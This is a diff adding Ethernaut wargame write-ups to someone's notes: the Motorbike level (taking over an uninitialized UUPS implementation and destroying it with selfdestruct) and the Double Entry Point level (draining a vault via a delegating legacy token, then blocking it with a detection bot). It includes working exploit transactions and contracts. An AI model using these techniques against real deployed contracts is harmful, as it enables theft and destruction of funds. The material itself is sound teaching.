@@ -1,5 +1,9 @@
 # Ethernaut Notes
 
+### Introduction
+
+The [Ethernaut](https://ethernaut.openzeppelin.com/) is a Web3/Solidity based wargame inspired on [overthewire.org](https://overthewire.org/wargames/), played in the Ethereum Virtual Machine. Each level is a smart contract that needs to be 'hacked'. The game is 100% open source and all levels are contributions made by other players.
+
 ### Level 0. Hello Ethernaut
 
 ```solidity
@@ -2592,7 +2596,524 @@ await contract.setMaxBalance(player);
 
 ### Level 25. Motorbike
 
+**Goal**: `player` has to make the proxy (`Motorbike`) unusable by destroying the implementation/logic contract (`Engine`) through `selfdestruct`.
+
+Useful links:
+
+- [Proxy Patterns](https://blog.openzeppelin.com/proxy-patterns/)
+- [UUPS Proxies](https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786)
+- [OpenZeppelin Proxies](https://docs.openzeppelin.com/contracts/4.x/api/proxy)
+- [Initializable](https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol) contract
+
+Given Contract:
+
+```solidity
+// SPDX-License-Identifier: MIT
+
+pragma solidity <0.7.0;
+
+import "@openzeppelin/contracts/utils/Address.sol";
+import "@openzeppelin/contracts/proxy/Initializable.sol";
+
+contract Motorbike {
+    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
+    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+
+    struct AddressSlot {
+        address value;
+    }
+
+    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
+    constructor(address _logic) public {
+        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
+        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
+        (bool success,) = _logic.delegatecall(
+            abi.encodeWithSignature("initialize()")
+        );
+        require(success, "Call failed");
+    }
+
+    // Delegates the current call to `implementation`.
+    function _delegate(address implementation) internal virtual {
+        // solhint-disable-next-line no-inline-assembly
+        assembly {
+            calldatacopy(0, 0, calldatasize())
+            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
+            returndatacopy(0, 0, returndatasize())
+            switch result
+            case 0 { revert(0, returndatasize()) }
+            default { return(0, returndatasize()) }
+        }
+    }
+
+    // Fallback function that delegates calls to the address returned by `_implementation()`.
+    // Will run if no other function in the contract matches the call data
+    fallback () external payable virtual {
+        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
+    }
+
+    // Returns an `AddressSlot` with member `value` located at `slot`.
+    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
+        assembly {
+            r_slot := slot
+        }
+    }
+}
+
+contract Engine is Initializable {
+    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
+    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+
+    address public upgrader;
+    uint256 public horsePower;
+
+    struct AddressSlot {
+        address value;
+    }
+
+    function initialize() external initializer {
+        horsePower = 1000;
+        upgrader = msg.sender;
+    }
+
+    // Upgrade the implementation of the proxy to `newImplementation`
+    // subsequently execute the function call
+    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
+        _authorizeUpgrade();
+        _upgradeToAndCall(newImplementation, data);
+    }
+
+    // Restrict to upgrader role
+    function _authorizeUpgrade() internal view {
+        require(msg.sender == upgrader, "Can't upgrade");
+    }
+
+    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
+    function _upgradeToAndCall(
+        address newImplementation,
+        bytes memory data
+    ) internal {
+        // Initial upgrade and setup call
+        _setImplementation(newImplementation);
+        if (data.length > 0) {
+            (bool success,) = newImplementation.delegatecall(data);
+            require(success, "Call failed");
+        }
+    }
+
+    // Stores a new address in the EIP1967 implementation slot.
+    function _setImplementation(address newImplementation) private {
+        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
+
+        AddressSlot storage r;
+        assembly {
+            r_slot := _IMPLEMENTATION_SLOT
+        }
+        r.value = newImplementation;
+    }
+}
+```
+
+As you can see current `Engine` implementation has no `selfdestruct` logic anywhere. So, we can't call `selfdestruct` with current implementation anyway. But, since it is a logic/implementation contract of proxy pattern, it can be upgraded to a new contract that has the `selfdestruct` in it.
+
+`upgradeToAndCall` method is at our disposal for upgrading to a new contract address, but it has an authorization check such that only the `upgrader` address can call it. So, `player` has to somehow take over as `upgrader`.
+
+The key thing to keep in mind here is that any storage variables defined in the logic contract i.e. `Engine` is **_actually_** stored in the proxy's (`Motorbike`'s) storage and not actually `Engine`. Proxy is the storage layer here which delegates _only_ the logic to logic/implementation contract (logic layer).
+
+The UUPS standardizes the location of the Logic Contract. Per the `EIP-1967` whitepaper:
+
+> _Logic contract address [is located in slot]_
+>
+> 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
+> (obtained as `bytes32(uint256(keccak256('eip1967.proxy.implementation')) - 1))`.
+
+What if we did try to write and read in the context of `Engine` directly, instead of going through proxy? We'll need address of `Engine` first. This address is at storage slot `\_IMPLEMENTATION_SLOT` of `Motorbike`. Let's read it:
+
+```js
+implAddr = await web3.eth.getStorageAt(
+  contract.address,
+  "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
+);
+```
+
+This yields a 32 byte value (each slot is 32 byte). Remove padding of `0`s to get 20 byte `address`:
+
+```js
+implAddr = "0x" + implAddr.slice(-40);
+```
+
+Now, if we sent a transaction directly to `initialize` of `Engine` rather than going through proxy, the code will run in `Engine`'s context rather than proxy's. That means the storage variables - `initialized`, `initializing` (inherited from `Initializable`), `upgrader` etc. will be read from `Engine`'s storage slots. And these variables will most likely will contain their default values - `false`, `false`, `0x0` respectively because `Engine` was supposed to be only the logic layer, not storage.
+And since `initialized` will be equal to `false` (default for `bool`) in context of `Engine` the `initializer` modifier on `initialize` method will pass!
+
+Call the `initialize` at `Engine`'s address i.e. at `implAddr`:
+
+```js
+initializeData = web3.eth.abi.encodeFunctionSignature("initialize()");
+
+await web3.eth.sendTransaction({
+  from: player,
+  to: implAddr,
+  data: initializeData,
+});
+```
+
+Alright, invoking `initialize` method must've now set `player` as `upgrader`. Verify by:
+
+```js
+upgraderData = web3.eth.abi.encodeFunctionSignature("upgrader()");
+
+(await web3.eth
+  .call({ from: player, to: implAddr, data: upgraderData })
+  .then((v) => "0x" + v.slice(-40).toLowerCase())) === player.toLowerCase();
+```
+
+So, `player` is now eligible to upgrade the implementation contract now through `upgradeToAndCall` method. Let's create the following malicious contract - `HackEngine` in Remix: (read more about [address(0)](https://stackoverflow.com/questions/48219716/what-is-address0-in-solidity))
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.7;
+
+contract HackEngine {
+    function explode() public {
+        selfdestruct(payable(address(0)));
+    }
+}
+```
+
+If we set the new implementation through `upgradeToAndCall`, passing `HackEngine` address and encoding of it's `explode` method as params, the existing `Engine` would destroy itself. This is because `_upgradeToAndCall` delegates a call to the given new implementation address with provided `data` param. And since `delegatecall` is context preserving, the `selfdestruct` of `explode` method would run in context of `Engine`. Thus `Engine` is destroyed.
+
+Upgrade `Engine` to `HackEngine`. First set up function data of `upgradeToAndCall` to call at `implAddress`:
+
+```js
+bombAddr = "<BombEngine-instance-address>";
+explodeData = web3.eth.abi.encodeFunctionSignature("explode()");
+
+upgradeSignature = {
+  name: "upgradeToAndCall",
+  type: "function",
+  inputs: [
+    {
+      type: "address",
+      name: "newImplementation",
+    },
+    {
+      type: "bytes",
+      name: "data",
+    },
+  ],
+};
+
+upgradeParams = [bombAddr, explodeData];
+
+upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, upgradeParams);
+```
+
+Now call `upgradeToAndCall` at `implAddr`:
+
+```js
+await web3.eth.sendTransaction({
+  from: player,
+  to: implAddr,
+  data: upgradeData,
+});
+```
+
+The `Engine` is destroyed. The `Motorbike` is now useless. `Motorbike` cannot even be repaired now because all the upgrade logic was in the logic contract which is now destroyed.
+
+The advantage of following an UUPS pattern is to have very minimal proxy to be deployed. The proxy acts as storage layer so any state modification in the implementation contract normally doesn't produce side effects to systems using it, since only the logic is used through delegatecalls.
+
+![](https://i0.wp.com/blog.openzeppelin.com/wp-content/uploads/2018/04/1Proxy0-1.png?resize=840%2C93&ssl=1)
+
+- To implement an upgradeable smart contract, the **logic layer** (i.e., the **implementation contract**) is separated from the **storage layer** (i.e., the **proxy contract**) and all calls to the proxy contract are delegated to the logic contract.
+
+This doesn't mean that you shouldn't watch out for vulnerabilities that can be exploited if we leave an implementation contract uninitialized.
+
+This was a slightly simplified version of what has really been discovered after months of the release of UUPS pattern.
+
+Takeways: never leaves implementation contracts uninitialized ;)
+
+If you're interested in what happened, read more [here](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680).
+
 ### Level 26. Double Entry Point
+
+**Goal**: `player` has to find the bug in the `CryptoVault` and create a Forta bot to protect it from being drained.
+
+This level features a `CryptoVault` with special functionality, the `sweepToken` function. This is a common function to retrieve tokens stuck in a contract. The `CryptoVault` operates with an `underlying` token that can't be swept, being it an important core's logic component of the `CryptoVault`, any other token can be swept.
+
+The underlying token is an instance of the DET (Double EntryPoint Token) token implemented in `DoubleEntryPoint` contract definition and the `CryptoVault` holds 100 units of it. Additionally the `CryptoVault` also holds 100 of `LegacyToken LGT`.
+
+In this level you should figure out where the bug is in `CryptoVault` and protect it from being drained out of tokens.
+
+The contract features a `Forta` contract where any user can register its own `detection bot` contract. Forta is a decentralized, community-based monitoring network to detect threats and anomalies on DeFi, NFT, governance, bridges and other Web3 systems as quickly as possible. Your job is to implement a `detection bot` and register it in the `Forta` contract. The bot's implementation will need to raise correct alerts to prevent potential attacks or bug exploits.
+
+Things that might help:
+
+- How does a double entry point work for a token contract?
+
+Useful links:
+
+- [Contract ABI Specification](https://docs.soliditylang.org/en/latest/abi-spec.html#contract-abi-specification)
+
+Given Contract:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import "@openzeppelin/contracts/access/Ownable.sol";
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+
+interface DelegateERC20 {
+  function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);
+}
+
+interface IDetectionBot {
+    function handleTransaction(address user, bytes calldata msgData) external;
+}
+
+interface IForta {
+    function setDetectionBot(address detectionBotAddress) external;
+    function notify(address user, bytes calldata msgData) external;
+    function raiseAlert(address user) external;
+}
+
+contract Forta is IForta {
+  mapping(address => IDetectionBot) public usersDetectionBots;
+  mapping(address => uint256) public botRaisedAlerts;
+
+  function setDetectionBot(address detectionBotAddress) external override {
+      require(address(usersDetectionBots[msg.sender]) == address(0), "DetectionBot already set");
+      usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
+  }
+
+  function notify(address user, bytes calldata msgData) external override {
+    if(address(usersDetectionBots[user]) == address(0)) return;
+    try usersDetectionBots[user].handleTransaction(user, msgData) {
+        return;
+    } catch {}
+  }
+
+  function raiseAlert(address user) external override {
+      if(address(usersDetectionBots[user]) != msg.sender) return;
+      botRaisedAlerts[msg.sender] += 1;
+  }
+}
+
+contract CryptoVault {
+    address public sweptTokensRecipient;
+    IERC20 public underlying;
+
+    constructor(address recipient) public {
+        sweptTokensRecipient = recipient;
+    }
+
+    function setUnderlying(address latestToken) public {
+        require(address(underlying) == address(0), "Already set");
+        underlying = IERC20(latestToken);
+    }
+
+    /*
+    ...
+    */
+
+    function sweepToken(IERC20 token) public {
+        require(token != underlying, "Can't transfer underlying token");
+        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
+    }
+}
+
+contract LegacyToken is ERC20("LegacyToken", "LGT"), Ownable {
+    DelegateERC20 public delegate;
+
+    function mint(address to, uint256 amount) public onlyOwner {
+        _mint(to, amount);
+    }
+
+    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {
+        delegate = newContract;
+    }
+
+    function transfer(address to, uint256 value) public override returns (bool) {
+        if (address(delegate) == address(0)) {
+            return super.transfer(to, value);
+        } else {
+            return delegate.delegateTransfer(to, value, msg.sender);
+        }
+    }
+}
+
+contract DoubleEntryPoint is ERC20("DoubleEntryPointToken", "DET"), DelegateERC20, Ownable {
+    address public cryptoVault;
+    address public player;
+    address public delegatedFrom;
+    Forta public forta;
+
+    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) public {
+        delegatedFrom = legacyToken;
+        forta = Forta(fortaAddress);
+        player = playerAddress;
+        cryptoVault = vaultAddress;
+        _mint(cryptoVault, 100 ether);
+    }
+
+    modifier onlyDelegateFrom() {
+        require(msg.sender == delegatedFrom, "Not legacy contract");
+        _;
+    }
+
+    modifier fortaNotify() {
+        address detectionBot = address(forta.usersDetectionBots(player));
+
+        // Cache old number of bot alerts
+        uint256 previousValue = forta.botRaisedAlerts(detectionBot);
+
+        // Notify Forta
+        forta.notify(player, msg.data);
+
+        // Continue execution
+        _;
+
+        // Check if alarms have been raised
+        if(forta.botRaisedAlerts(detectionBot) > previousValue) revert("Alert has been triggered, reverting");
+    }
+
+    function delegateTransfer( <==
+        address to,
+        uint256 value,
+        address origSender
+    ) public override onlyDelegateFrom fortaNotify returns (bool) {
+        _transfer(origSender, to, value);
+        return true;
+    }
+}
+```
+
+First, let's figure out the exploit that allows to drain the underlying (DET) tokens. If you see the `sweepToken()` method it can be seen that it restricts sweeping the underlying tokens with a `require` check - as expected. But take a look at `LegacyToken`'s `transfer()` method:
+
+```solidity
+if (address(delegate) == address(0)) {
+    return super.transfer(to, value);
+} else {
+    return delegate.delegateTransfer(to, value, msg.sender);
+}
+```
+
+Looks like it actually calls `delegateTransfer()` method of some `DelegateERC20` contract. But this `DelegateERC20` is nothing but the implementation of the underlying (`DET`) token itself. And `delegateTransfer()` simply transfers the tokens according to given parameters. The only restriction `delegateTransfer()` puts is that `msg.sender` must be the `LegacyToken` (`delegatedFrom` address) contract.
+
+So we can indirectly sweep the underlying tokens through `transfer()` of `LegacyToken` contract. We simply call `sweepToken` with address of `LegacyToken` contract. That in turn would make the `LegacyContract` to call the `DoubleEntryPoint`'s (DET token) `delegateTransfer()` method.
+
+```js
+vault = await contract.cryptoVault();
+
+// Check initial balance (100 DET)
+await contract.balanceOf(vault).then((v) => v.toString()); // '100000000000000000000'
+
+legacyToken = await contract.delegatedFrom();
+
+// sweepTokens(..) function call data
+sweepSig = web3.eth.abi.encodeFunctionCall(
+  {
+    name: "sweepToken",
+    type: "function",
+    inputs: [{ name: "token", type: "address" }],
+  },
+  [legacyToken]
+);
+
+// Send exploit transaction
+await web3.eth.sendTransaction({ from: player, to: vault, data: sweepSig });
+
+// Check balance (0 DET)
+await contract.balanceOf(vault).then((v) => v.toString()); // '0'
+```
+
+And `CryptoVault` is swept of `DET` tokens!
+
+This worked because during invocation `transfer()` of `LegacyToken` the `msg.sender` was `CryptoVault`. And when `delegateTransfer()` invoked right after, the `origSender` is the passed in address of `CryptoVault` contract and `msg.sender` is `LegacyToken` so `onlyDelegateFrom` modifier checks out.
+
+Now to prevent this exploit we have to write a bot which would be a simple contract implementing the `IDetectionBot` interface. In the bot's `handleTransaction(..)` we could simply check that the address was not `CryptoVault` address. If so, raise alert. Hence preventing sweep.
+
+Open up Remix and deploy the bot (on Rinkeby) with **contract.cryptoVault() address** and copy its address.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.7;
+
+interface IForta {
+    function raiseAlert(address user) external;
+}
+
+contract FortaDetectionBot {
+    address private cryptoVault;
+
+    constructor(address _cryptoVault) {
+        cryptoVault = _cryptoVault; // vault = await contract.cryptoVault();
+    }
+
+    function handleTransaction(address user, bytes calldata msgData) external {
+        // Extract the address of original message sender
+        // which should start at offset 168 (0xa8) of calldata
+        address origSender;
+        assembly {
+            origSender := calldataload(0xa8)
+        }
+
+        if (origSender == cryptoVault) {
+            IForta(msg.sender).raiseAlert(user);
+        }
+    }
+}
+```
+
+Note that in the above `FortaDetectionBot` contract we extract the address of the original transaction sender by calculating its offset according to the [ABI encoding specs](https://docs.soliditylang.org/en/latest/abi-spec.html#argument-encoding) and [Layout of call data](https://docs.soliditylang.org/en/v0.8.3/internals/layout_in_calldata.html).
+
+Understand the encoding rule of function parameters and use this knowledge to get the correct data offset you want to get in `calldata`.
+
+i.e. Layout of calldata when `function handleTransaction(address user, bytes calldata msgData) external;` is called.
+
+| calldata offset | length | element                                | type    | example value                                                      |
+| --------------- | ------ | -------------------------------------- | ------- | ------------------------------------------------------------------ |
+| 0x00            | 4      | function signature (handleTransaction) | bytes4  | 0x220ab6aa                                                         |
+| 0x04            | 32     | user                                   | address | 0x000000000000000000000000XxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx |
+| 0x24            | 32     | offset of msgData                      | uint256 | 0x0000000000000000000000000000000000000000000000000000000000000040 |
+| 0x44            | 32     | length of msgData                      | uint256 | 0x0000000000000000000000000000000000000000000000000000000000000064 |
+| 0x64            | 4      | function signature (delegateTransfer)  | bytes4  | 0x9cd1a121                                                         |
+| 0x68            | 32     | to                                     | address | 0x000000000000000000000000XxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx |
+| 0x88            | 32     | value                                  | uint256 | 0x0000000000000000000000000000000000000000000000056bc75e2d63100000 |
+| 0xA8            | 32     | origSender                             | address | 0x000000000000000000000000XxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx |
+| 0xC8            | 28     | padding                                | bytes   | 0x00000000000000000000000000000000000000000000000000000000         |
+
+Now set the bot in `Forta` contract:
+
+```js
+botAddr = "0x4587415153748ad20E7Cfc2F447984e6A74b585d";
+
+// Forta contract address
+forta = await contract.forta();
+
+// setDetectionBot() function call data
+setBotSig = web3.eth.abi.encodeFunctionCall(
+  {
+    name: "setDetectionBot",
+    type: "function",
+    inputs: [{ type: "address", name: "detectionBotAddress" }],
+  },
+  [botAddr]
+);
+
+// Send the transaction setting the bot
+await web3.eth.sendTransaction({ from: player, to: forta, data: setBotSig });
+```
+
+Forta comprises a decentralized network of independent node operators who scan all transactions and block-by-block state changes for outlier transactions and threats. When an issue is detected, node operators send alerts to subscribers of potential risks, which enables them to take action.
+
+The presented example is just for educational purpose since Forta bot is not modeled into smart contracts. In Forta, a bot is a code script to detect specific conditions or events, but when an alert is emitted it does not trigger automatic actions - at least not yet. In this level, the bot's alert effectively trigger a revert in the transaction, deviating from the intended Forta's bot design.
+
+Detection bots heavily depends on contract's final implementations and some might be upgradeable and break bot's integrations, but to mitigate that you can even create a specific bot to look for contract upgrades and react to it. Learn how to do it [here](https://docs.forta.network/en/latest/quickstart/).
+
+You have also passed through a recent security issue that has been uncovered during OpenZeppelin's latest [collaboration with Compound protocol](https://compound.finance/governance/proposals/76).
+
+Having tokens that present a double entry point is a non-trivial pattern that might affect many protocols. This is because it is commonly assumed to have one contract per token. But it was not the case this time :) You can read the entire details of what happened [here](https://blog.openzeppelin.com/compound-tusd-integration-issue-retrospective/).
 
 ## MISC.
 
